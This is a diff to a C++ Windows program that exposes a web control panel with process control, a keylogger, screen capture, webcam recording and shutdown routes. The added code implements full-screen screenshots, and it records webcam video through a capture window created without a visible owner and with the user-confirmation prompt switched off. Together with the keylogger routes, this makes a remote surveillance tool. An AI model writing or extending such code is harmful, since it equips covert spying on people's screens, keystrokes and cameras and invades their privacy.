@@ -30,6 +30,14 @@
 #include <sstream>
 #include <algorithm>
 
+// --- ADDED FOR SCREENSHOT & WEBCAM ---
+#include <vfw.h>     // Video for Windows
+// Link libraries (cho Visual Studio/MSVC)
+#pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "vfw32.lib")
+// -------------------------------------
+
 std::map<std::string, std::string> APPS = {
     {"notepad", "notepad.exe"},
     {"mspaint", "mspaint.exe"},
@@ -334,8 +342,108 @@ std::string keylog_receive(const std::map<std::string, std::string>& query) {
 }
 
 // ====================== SCREENSHOT ======================
+
+std::string take_screenshot() {
+    int x1 = 0;
+    int y1 = 0;
+    int x2 = GetSystemMetrics(SM_CXSCREEN);
+    int y2 = GetSystemMetrics(SM_CYSCREEN);
+    int width = x2 - x1;
+    int height = y2 - y1;
+
+    HDC hScreen = GetDC(NULL);
+    HDC hDC = CreateCompatibleDC(hScreen);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
+    SelectObject(hDC, hBitmap);
+
+    BitBlt(hDC, 0, 0, width, height, hScreen, x1, y1, SRCCOPY);
+
+    BITMAP bmpScreen;
+    GetObject(hBitmap, sizeof(BITMAP), &bmpScreen);
+    
+    BITMAPFILEHEADER bmfHeader;
+    BITMAPINFOHEADER bi;
+
+    bi.biSize = sizeof(BITMAPINFOHEADER);
+    bi.biWidth = bmpScreen.bmWidth;
+    bi.biHeight = bmpScreen.bmHeight;
+    bi.biPlanes = 1;
+    bi.biBitCount = 32;
+    bi.biCompression = BI_RGB;
+    bi.biSizeImage = 0;
+    bi.biXPelsPerMeter = 0;
+    bi.biYPelsPerMeter = 0;
+    bi.biClrUsed = 0;
+    bi.biClrImportant = 0;
+
+    DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
+    
+    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
+    char *lpbitmap = (char *)GlobalLock(hDIB);
+    GetDIBits(hScreen, hBitmap, 0, (UINT)bmpScreen.bmHeight, lpbitmap, (BITMAPINFO *)&bi, DIB_RGB_COLORS);
+
+    std::string filename = "screenshot.bmp";
+    HANDLE hFile = CreateFile(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    
+    DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
+    bmfHeader.bfSize = dwSizeofDIB;
+    bmfHeader.bfType = 0x4D42; // BM
+
+    DWORD dwBytesWritten = 0;
+    WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
+    WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
+    WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);
+
+    CloseHandle(hFile);
+    GlobalUnlock(hDIB);
+    GlobalFree(hDIB);
+    DeleteObject(hBitmap);
+    DeleteDC(hDC);
+    ReleaseDC(NULL, hScreen);
+
+    return filename;
+}
+
 // ====================== WEBCAM REC 10S ======================
+
+void record_webcam_thread(std::string filename, int duration_ms) {
+    // Tạo cửa sổ capture ẩn
+    HWND hWndC = capCreateCaptureWindowA("WebcamCapture", WS_POPUP, 0, 0, 320, 240, NULL, 0);
+    
+    if (hWndC) {
+        if (SendMessage(hWndC, WM_CAP_DRIVER_CONNECT, 0, 0)) {
+            
+            SendMessage(hWndC, WM_CAP_FILE_SET_CAPTURE_FILEA, 0, (LPARAM)filename.c_str());
+
+            CAPTUREPARMS CaptureParms;
+            SendMessage(hWndC, WM_CAP_GET_SEQUENCE_SETUP, sizeof(CAPTUREPARMS), (LPARAM)&CaptureParms);
+            CaptureParms.fRequestMicroSecPerFrame = (1000000 / 15); // 15 FPS
+            CaptureParms.fMakeUserHitOKToCapture = FALSE;
+            CaptureParms.fYield = TRUE;
+            CaptureParms.fCaptureAudio = FALSE;
+            
+            // Limit time
+            CaptureParms.fLimitEnabled = TRUE;
+            CaptureParms.wTimeLimit = duration_ms / 1000;
+
+            SendMessage(hWndC, WM_CAP_SET_SEQUENCE_SETUP, sizeof(CAPTUREPARMS), (LPARAM)&CaptureParms);
+            SendMessage(hWndC, WM_CAP_SEQUENCE, 0, 0); // Quay
+            SendMessage(hWndC, WM_CAP_DRIVER_DISCONNECT, 0, 0);
+        }
+        DestroyWindow(hWndC);
+    }
+}
+
+std::string start_webcam_recording() {
+    std::string filename = "webcam_video.avi";
+    std::thread t(record_webcam_thread, filename, 10000); // 10s
+    t.detach();
+    return filename;
+}
+
 // ====================== SHUTDOWN/RESTART ======================
+
 
 // ====================== CHƯƠNG TRÌNH CHÍNH ======================
 
@@ -405,7 +513,7 @@ int main() {
                                      "<li><a href='/processes'>List processes</a></li>"
                                      "<li><a href='/processes/actions'>Start/Stop processes</a></li>"
                                      "<li><a href='/keylogger'>Keylogger</a></li>"
-                                     "<li><a href='/screenshoot'>Screenshoot</a></li>"
+                                     "<li><a href='/screenshot'>Screenshot</a></li>"
                                      "<li><a href='/webcam_rec'>Record webcam 10s</a></li>"
                                      "<li><a href='/shutdown'>Shutdown</a> (admin)</li>"
                                      "<li><a href='/restart'>Restart</a> (admin)</li>"
@@ -426,6 +534,21 @@ int main() {
                 response = keylog_control();
             } else if (route == "/keylogger/send") {
                 response = keylog_receive(query);
+            
+            // === LOGIC MỚI ===
+            } else if (route == "/screenshot") {
+                std::string file = take_screenshot();
+                response = html_page("<h1>Screenshot Saved</h1><p>File: " + file + "</p>");
+            } else if (route == "/webcam_rec") {
+                std::string file = start_webcam_recording();
+                response = html_page("<h1>Recording Started</h1><p>Saving 10s video to: " + file + "</p>");
+            } else if (route == "/shutdown") {
+                power_action(false);
+                response = html_page("<h1>Shutting down...</h1>");
+            } else if (route == "/restart") {
+                power_action(true);
+                response = html_page("<h1>Restarting...</h1>");
+            // =================
             } else {
                 response = html_page("<h1>404 Not Found</h1>");
             }
